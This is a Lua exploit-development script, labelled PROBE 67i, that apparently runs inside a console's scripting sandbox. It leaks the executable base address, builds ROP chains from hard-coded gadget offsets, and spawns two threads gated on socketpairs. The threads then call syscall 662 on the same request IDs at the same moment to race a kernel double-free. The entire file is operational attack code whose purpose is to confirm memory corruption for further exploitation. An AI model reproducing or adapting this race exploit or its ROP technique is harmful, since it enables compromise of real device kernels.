-- CRASH_CLASS: HIGH
-- PROBE 67i: Socketpair-gated double-free race
--
-- The 65l race only fires in warm sessions (pid>600) where threads
-- truly parallelize. Fresh restarts (pid<100) serialize threads.
-- Fix: gate both children behind a socketpair read() so they block
-- until main thread signals, then both call 662 within microseconds.
--
-- Also: warm up the system with multiple rapid thread spawns first.

print("=== PROBE 67i: GATED RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- =============================================
-- [WARMUP] Spawn and exit several threads to warm up scheduler
-- =============================================
print("-- [WARMUP] --")
local warmup_markers = memory.alloc(0x100)
for w = 1, 8 do
    local ws = memory.alloc(0x4000)
    local wsb = N(ws)
    local wsp = wsb + 0x2000 - ((wsb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(wsb + i, 0) end
    local wo = 0
    local function emW(v) wq(wsp + wo, v); wo = wo + 8 end
    emW(g_pop_rax); emW(uint64(0xAA + w))
    emW(g_pop_rdi); emW(uint64(N(warmup_markers) + w * 8))
    emW(g_mov_m_rax)
    emW(g_pop_rdi); emW(uint64(0))
    emW(g_pop_rax); emW(uint64(431))
    emW(stub)

    local wp = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(wp) + i, 0) end
    wq(N(wp), g_bare_ret)
    wq(N(wp) + 0x10, uint64(wsb))
    wq(N(wp) + 0x18, uint64(0x2000))
    pcall(function() mk(455)(wp, uint64(0x38)) end)
end
for w = 1, 50000 do end
local warmup_ok = 0
for w = 1, 8 do
    local v = rq(N(warmup_markers) + w * 8)
    if v ~= nil and N(v) ~= 0 then warmup_ok = warmup_ok + 1 end
end
print("  warmup threads completed: " .. warmup_ok .. "/8")

if not alive() then print("DEAD after warmup"); return end

-- =============================================
-- [GATE] Create socketpairs for synchronization
-- =============================================
print("")
print("-- [GATE] SOCKETPAIRS --")
local sp_buf_A = memory.alloc(16)
wd(N(sp_buf_A), 0xFFFFFFFF); wd(N(sp_buf_A) + 4, 0xFFFFFFFF)
pcall(function()
    mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf_A)))
end)
local gate_rd_A = rd(N(sp_buf_A)) or -1
local gate_wr_A = rd(N(sp_buf_A) + 4) or -1

local sp_buf_B = memory.alloc(16)
wd(N(sp_buf_B), 0xFFFFFFFF); wd(N(sp_buf_B) + 4, 0xFFFFFFFF)
pcall(function()
    mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf_B)))
end)
local gate_rd_B = rd(N(sp_buf_B)) or -1
local gate_wr_B = rd(N(sp_buf_B) + 4) or -1

print(string.format("  gateA: rd=%d wr=%d", gate_rd_A, gate_wr_A))
print(string.format("  gateB: rd=%d wr=%d", gate_rd_B, gate_wr_B))

if gate_rd_A < 0 or gate_wr_A < 0 or gate_rd_B < 0 or gate_wr_B < 0 then
    print("SOCKETPAIR FAILED"); print("=== DONE ==="); return
end

-- =============================================
-- [RACE] Gated double-free loop
-- =============================================
print("")
print("-- [RACE] GATED DOUBLE-FREE --")

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_buf_A = memory.alloc(8)
local tmp_buf_B = memory.alloc(8)
local write_byte = memory.alloc(8)
wd(N(write_byte), 0x42)

local ITERS = 30
local total_doubles = 0
local total_a = 0
local total_b = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: DEAD", iter))
        break
    end

    -- Submit + poll
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    if #ids < BATCH then
        print(string.format("  iter %d: only got %d IDs", iter, #ids))
        break
    end

    local count = #ids
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Child A: marker → read(gate_rd_A) [blocks] → 662 → exit
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    -- Write marker
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    -- read(gate_rd_A, tmp_buf_A, 1) — blocks until main writes
    emA(g_pop_rax); emA(uint64(3))  -- sys_read
    emA(g_pop_rdi); emA(uint64(gate_rd_A))
    emA(g_pop_rsi); emA(uint64(N(tmp_buf_A)))
    emA(g_pop_rdx); emA(uint64(1))
    emA(stub)
    -- 662(del_ids, count, states_A)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    -- thr_exit(0)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Child B: marker → read(gate_rd_B) [blocks] → 662 → exit
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rax); emB(uint64(3))
    emB(g_pop_rdi); emB(uint64(gate_rd_B))
    emB(g_pop_rsi); emB(uint64(N(tmp_buf_B)))
    emB(g_pop_rdx); emB(uint64(1))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- Spawn both
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for both markers (children are running, blocked on read)
    local waited = 0
    local a_ready, b_ready = false, false
    for w = 1, 500000 do
        if not a_ready then
            local ma = rq(N(marker_A))
            if ma ~= nil and N(ma) ~= 0 then a_ready = true end
        end
        if not b_ready then
            local mb = rq(N(marker_B))
            if mb ~= nil and N(mb) ~= 0 then b_ready = true end
        end
        if a_ready and b_ready then waited = w; break end
    end

    if not (a_ready and b_ready) then
        print(string.format("  iter %d: TIMEOUT a=%s b=%s", iter,
            tostring(a_ready), tostring(b_ready)))
        break
    end

    -- Small delay to ensure both children are blocked on read()
    for d = 1, 1000 do end

    -- FIRE! Write 1 byte to both gate fds back-to-back
    pcall(function()
        mk(4)(uint64(gate_wr_A), uint64(N(write_byte)), uint64(1))
    end)
    pcall(function()
        mk(4)(uint64(gate_wr_B), uint64(N(write_byte)), uint64(1))
    end)

    -- Wait for completion
    for w = 1, 100000 do end

    -- Count results
    local a_ok, b_ok, doubles = 0, 0, 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_a = total_a + a_ok
    total_b = total_b + b_ok
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: *** %d DOUBLES *** A=%d B=%d wait=%d",
            iter, doubles, a_ok, b_ok, waited))
    elseif iter <= 3 or iter == ITERS then
        print(string.format("  iter %d: A=%d B=%d wait=%d",
            iter, a_ok, b_ok, waited))
    end
end

print("")
print(string.format("SUMMARY: %d iters, A=%d B=%d DOUBLES=%d",
    ITERS, total_a, total_b, total_doubles))
if total_doubles > 0 then
    print("*** DOUBLE FREE CONFIRMED ***")
end
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67i DONE ===")
